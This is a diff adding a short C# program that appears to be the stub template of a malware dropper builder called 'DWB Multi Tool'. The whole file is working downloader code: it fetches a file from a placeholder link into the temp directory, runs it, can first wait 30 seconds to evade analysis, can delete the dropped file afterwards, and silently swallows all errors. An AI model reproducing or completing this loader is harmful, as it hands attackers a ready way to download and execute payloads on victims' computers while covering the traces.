@@ -1,0 +1,57 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Threading;
+using System.Diagnostics;
+
+namespace DWB_Multi_Tool
+{
+    class Program
+    {
+        public static void Main(string[] args)
+        {
+            // Set filename var
+            string FileName = "DownloadedFile2345676543" + DateTime.Now.Millisecond + "%EXTENTION%";
+
+            // Catch exeptions
+            try
+            {
+                // Check if delay is wanted
+                if ("%DELAY%" == "TRUE")
+                {
+                    Thread.Sleep(30000);
+                }
+
+                // Goto temp
+                Directory.SetCurrentDirectory(Path.GetTempPath());
+
+                // Create new WebClient instance
+                using (WebClient Wc = new WebClient())
+                {
+                    // Download file
+                    Wc.DownloadFile("%LINK%", Directory.GetCurrentDirectory() + @"\" + FileName);
+                }
+
+                // Start file
+                Process.Start(FileName);
+
+                // Check if file deletion is wanted
+                if ("%DELETE%" == "TRUE")
+                {
+                    // Wait
+                    Thread.Sleep(15000);
+
+                    // Delete file
+                    File.Delete(FileName);
+                }
+            }
+            catch
+            {
+
+            }
+
+            // Exit
+            Environment.Exit(0);
+        }
+    }
+}
